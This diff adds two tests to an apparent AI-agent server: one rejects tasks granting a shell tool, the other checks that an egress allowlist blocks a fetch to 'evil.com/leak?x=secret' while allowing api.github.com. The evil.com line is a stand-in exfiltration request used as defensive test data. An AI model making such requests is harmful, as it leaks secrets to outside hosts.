@@ -452,6 +452,18 @@ class TestAgentRunRoutes:
             "task": "t", "provider": "p", "model": "m",
         }).status_code == 422
 
+    def test_task_rejects_shell_grant(self, client):
+        # AC-2 (security review High): a shell tool escapes the egress
+        # allowlist (arbitrary curl/pip/etc.), so a /task grant containing it
+        # is rejected up front with a clear 400 — not silently never run.
+        c, _ = client
+        r = c.post("/v1/agent/task", json={
+            "task": "t", "tools": ["read_file", "execute_shell_command"],
+            "provider": "p", "model": "m",
+        })
+        assert r.status_code == 400
+        assert "execute_shell_command" in r.json()["detail"]
+
     def test_task_enforces_grant_end_to_end(self, client, monkeypatch):
         # Full /task path with EngineClient stubbed: the stubbed chat() calls
         # the (route-installed) ScopedToolManager.execute_tool on an off-grant
@@ -516,6 +528,71 @@ class TestAgentRunRoutes:
         assert any(e["type"] == "tool_denied" for e in evs)
         call = next((e for e in evs if e["type"] == "tool_call"), None)
         assert call is not None and call["data"]["tool"] == "read_file"  # name not empty
+
+    def test_task_enforces_egress_end_to_end(self, client, monkeypatch):
+        # AC-2: full /task path with a network spec. The stubbed chat() drives
+        # a granted network tool (fetch_url) at an OFF-allowlist host through
+        # the route-installed ScopedToolManager. The egress check denies it,
+        # the base never runs it, a network_policy_denied event lands on the
+        # 'network' channel, and the run still completes. Then a granted host
+        # is allowed and emits network_policy_allowed.
+        c, _reg = client
+        from ppxai.server.routes import agent_v1
+        from ppxai.engine.types import Event, EventType
+        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider
+        from ppxai.engine.agent_scoped_tools import ScopedToolManager
+
+        class _P(OpenAICompatibleProvider):
+            def __init__(self): pass
+        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
+
+        class _BaseTM:
+            max_iterations = 3
+            def __init__(self): self.ran = []
+            async def execute_tool(self, name, **kw):
+                self.ran.append((name, kw)); return "fetched"
+
+        class _StubEngine:
+            def __init__(self): self.tool_manager = _BaseTM()
+            def set_provider(self, p): pass
+            def set_model(self, m): pass
+            def enable_tools(self): pass
+            async def chat(self, task, stream=False):
+                # one denied (evil.com), one allowed (api.github.com)
+                await self.tool_manager.execute_tool(
+                    "fetch_url", url="https://evil.com/leak?x=secret")
+                await self.tool_manager.execute_tool(
+                    "fetch_url", url="https://api.github.com/repos/x")
+                yield Event(type=EventType.STREAM_END, data="done")
+
+        stub = _StubEngine()
+        import ppxai.engine.client as client_mod
+        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)
+
+        resp = c.post("/v1/agent/task", json={
+            "task": "research", "tools": ["fetch_url"],
+            "provider": "p", "model": "m",
+            "network": {"allow_outbound": ["api.github.com"]},
+        })
+        assert resp.status_code == 200
+        rid = resp.json()["run_id"]
+        one = self._poll_terminal(c, rid)
+        assert one["status"] == "completed"
+        # the allowlist persisted on the run meta (provenance/audit)
+        assert one["network"] == ["api.github.com"]
+        # AC-2: evil.com NEVER fetched; only the allowed host ran
+        assert isinstance(stub.tool_manager, ScopedToolManager)
+        assert stub.tool_manager._base.ran == [
+            ("fetch_url", {"url": "https://api.github.com/repos/x"})
+        ]
+        # both decisions on the 'network' channel
+        evs = c.get(f"/v1/agent/runs/{rid}/events?category=network").json()["events"]
+        denied = next((e for e in evs if e["type"] == "network_policy_denied"), None)
+        allowed = next((e for e in evs if e["type"] == "network_policy_allowed"), None)
+        assert denied is not None and denied["data"]["target_host"] == "evil.com"
+        assert denied["data"]["allowlist_rule_id"] is None
+        assert allowed is not None and allowed["data"]["target_host"] == "api.github.com"
+        assert allowed["data"]["run_id"] == rid
 
     def test_task_provider_error_fails_run(self, client, monkeypatch):
         # codex MEDIUM: the engine reports provider/config failures as
